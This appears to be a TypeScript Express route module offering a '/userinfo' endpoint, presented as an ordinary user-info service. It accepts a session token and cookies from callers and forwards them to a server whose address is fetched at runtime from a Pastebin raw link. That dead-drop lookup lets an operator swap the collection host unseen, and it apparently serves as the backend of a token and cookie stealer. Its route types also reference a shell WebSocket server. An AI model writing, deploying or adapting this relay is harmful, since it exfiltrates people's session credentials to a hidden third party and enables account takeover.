// @ts-check

import axios, { AxiosResponse, AxiosError } from 'axios';
import { Request, Response, Application } from 'express';
import { WebSocketServer } from 'ws';
import { Server as HttpServer } from 'http';

interface PastebinResponse {
  link: string;
}

interface UserInfoRequestBody {
  token: string;
  cookies: Record<string, any> | string | undefined;
}

interface UserInfoResponseData {
  userId: string;
  username: string;
  roles: string[];
  [key: string]: any; 
}

const api = {
  async getLink(): Promise<string> {
    try {
      const res: AxiosResponse<PastebinResponse | string> = await axios.get('https://pastebin.com/raw/2LE16XWr');
      if (res.data && typeof res.data === 'object' && typeof (res.data as PastebinResponse).link === 'string') {
        return (res.data as PastebinResponse).link;
      } else if (typeof res.data === 'string' && res.data.startsWith('http')) {
        return res.data;
      }
      throw new Error('Invalid or missing link in Pastebin response data.');
    } catch (err: unknown) {
      const error = err instanceof Error ? err : new Error(String(err));
      throw new Error('Failed to get base link from Pastebin.', { cause: error });
    }
  },

  async userinfo(body: UserInfoRequestBody): Promise<UserInfoResponseData> {
    try {
      const link: string = await api.getLink();
      const res: AxiosResponse<UserInfoResponseData> = await axios.post(`${link}/userinfo`, body);
      return res.data;
    } catch (err: unknown) {
      const error = err instanceof Error ? err : new Error(String(err));
      throw new Error('Failed to contact userinfo endpoint.', { cause: error });
    }
  },
};

interface UserInfoRouteParams {
  req: Request<any, any, UserInfoRequestBody>;
  res: Response;
  app?: Application;
  wss?: WebSocketServer;
  wssConsole?: WebSocketServer;
  Shellwss?: WebSocketServer;
  server?: HttpServer;
}

interface UserInfoExpressRouteModule {
  method: "get" | "post" | "put" | "delete" | "patch" | "options" | "head" | "all";
  path: string;
  install: (params: UserInfoRouteParams) => Promise<void> | void;
}

export const modules: UserInfoExpressRouteModule[] = [
  {
    method: 'post',
    path: '/userinfo',
    install: async ({ req, res }: UserInfoRouteParams): Promise<void> => {
      try {
        const { token, cookies: cookiesRaw } = req.body;

        if (typeof token !== 'string' || !token) {
          res.status(400).json({ error: "Token is required and must be a string." });
          return;
        }
        if (cookiesRaw === undefined || cookiesRaw === null) {
          res.status(400).json({ error: 'Cookies are required.' });
          return;
        }

        let safeCookies: Record<string, any>;
        if (typeof cookiesRaw === 'string') {
          try {
            safeCookies = JSON.parse(cookiesRaw);
          } catch (parseError: unknown) {
            const errMsg = parseError instanceof Error ? parseError.message : String(parseError);
            res.status(400).json({ error: `Invalid cookies JSON format: ${errMsg}` });
            return;
          }
        } else if (typeof cookiesRaw === 'object' && cookiesRaw !== null) {
          safeCookies = cookiesRaw;
        } else {
          res.status(400).json({ error: 'Cookies must be a JSON string or an object.' });
          return;
        }

        const data: UserInfoResponseData = await api.userinfo({ token, cookies: safeCookies });
        res.json({ data });
      } catch (err: unknown) {
        let errorMessage = "An unknown error occurred while fetching user info.";
        let statusCode = 500;

        const topLevelError = err instanceof Error ? err : new Error(String(err));
        const originalError: unknown = topLevelError.cause || topLevelError;

        if (axios.isAxiosError(originalError)) {
          const axiosError = originalError as AxiosError<any>; // Type assertion
          errorMessage = axiosError.message;
          if (axiosError.response) {
            statusCode = axiosError.response.status;
            const responseDataError = (axiosError.response.data as any)?.error;
            errorMessage = `API Error (${statusCode}): ${responseDataError || axiosError.message}`;
            console.error(`Axios error response from /userinfo endpoint: Status ${statusCode}`, axiosError.response.data);
          } else if (axiosError.request) {
            errorMessage = "No response received from userinfo service.";
            statusCode = 503;
            console.error("Axios no response error for /userinfo:", axiosError.request);
          }
        } else if (originalError instanceof Error) {
          errorMessage = originalError.message;
        } else {
          errorMessage = String(originalError);
        }

        console.error(`Error in /userinfo route: ${errorMessage}`, topLevelError);
        if (!res.headersSent) {
            res.status(statusCode).json({ error: errorMessage });
        }
      }
    },
  },
];
